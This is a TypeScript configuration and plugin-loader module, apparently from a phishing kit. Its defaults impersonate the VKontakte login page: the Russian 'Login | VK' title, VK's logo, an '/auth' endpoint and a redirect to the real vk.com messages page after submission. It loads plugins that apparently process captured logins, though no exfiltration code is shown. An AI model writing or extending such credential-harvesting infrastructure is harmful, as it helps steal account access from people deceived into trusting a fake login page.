import { join } from "path";
import { parse } from "yaml";
import { readFileSync, existsSync } from "fs";
import { EventEmitter } from "events";
import chalk from "chalk";

export const configPath = join(process.cwd(), "config.yml");
export const pluginsDirectory = join(process.cwd(), "plugins");
const actualConfig = existsSync(configPath)
  ? parse(readFileSync(configPath, "utf8"))
  : {
      plugins:
        /*
          this is a very badass hack
          Error message will be logged to console 
          and plugins will set to {}, because console log
          returns undefined

          God please sorry me
        */

        <undefined>(
          console.log(
            chalk.redBright(
              `Unable to read config file because id does not exists at ${configPath}`
            )
          )
        ) || {}
    };

export const config = {
  title: "Вход | ВКонтакте",
  image: "https://vk.com/images/brand/vk-logo.png",
  exit: "https://vk.com/im",
  port: 3000,
  authUrl: "/auth",
  plugins: {},
  exposePluginsConfigOnClient: false,

  ...actualConfig
};
export const EventsPipe = new EventEmitter();

(() => {
  if (!existsSync(pluginsDirectory) || process.env.SAPPER_EXPORT)
    return console.log(
      chalk.redBright(
        `Unable to load plugins because plugins dir (${pluginsDirectory}) does not exists`
      )
    );

  for (const pluginName in config.plugins || {}) {
    const pluginBasePath = join(pluginsDirectory, pluginName);

    type Plugin = {
      init: (config: unknown, ee: EventEmitter) => void;
      name?: string;
    };

    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const plugin: Plugin = require(pluginBasePath);
    const pluginConfig = config.plugins[pluginName];

    const pluginFriendlyName =
      typeof plugin.name === "string" ? plugin.name : pluginName;

    if (
      pluginConfig === false ||
      (typeof pluginConfig === "object" &&
        "enabled" in pluginConfig &&
        pluginConfig.enabled === false)
    ) {
      console.log(
        chalk.yellowBright(
          `Plugin ${chalk.bold(
            pluginFriendlyName
          )} was not initialized, because it's disabled by config`
        )
      );
    } else {
      plugin.init(pluginConfig, EventsPipe);
      console.log(
        chalk.greenBright(
          `Plugin ${pluginFriendlyName} was successful initialized`
        )
      );
    }
  }
})();

EventsPipe.emit("system:startup");
